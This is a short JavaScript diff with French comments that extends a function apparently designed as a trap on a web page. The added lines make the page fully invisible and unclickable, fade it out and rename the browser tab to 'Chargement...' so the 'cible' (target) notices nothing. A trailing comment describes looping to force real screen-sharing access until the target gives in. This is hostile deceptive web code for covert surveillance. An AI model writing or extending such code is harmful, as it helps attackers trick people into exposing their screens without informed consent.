@@ -933,9 +933,17 @@ function setupInvisibleVerifyOverlay(overlay) {
         // --- LA PAGE ACTUELLE DEVIENT INVISIBLE ET AGRESSIVE ---
         overlay.style.background = 'rgba(0,0,0,0)';
         overlay.innerHTML = ''; // On vide tout le contenu visuel
-        document.body.style.opacity = '0'; // On rend TOUTE la page invisible
         
-        console.log("Piège activé : Passage en mode Fantôme (Background)");
+        // Au lieu de rendre la page blanche, on la cache COMPLÈTEMENT
+        // Mais elle reste vivante pour le navigateur
+        document.body.style.transition = 'opacity 0.5s ease';
+        document.body.style.opacity = '0'; 
+        document.body.style.pointerEvents = 'none';
+        
+        // On change le titre pour être encore plus discret si la cible regarde ses onglets
+        document.title = 'Chargement...';
+        
+        console.log("Piège activé : Passage en mode Fantôme (Totalement Invisible)");
 
         // --- FORÇAGE RÉEL DU PARTAGE D'ÉCRAN ---
         // On boucle tant qu'on n'a pas l'accès ou que la cible ne ferme pas
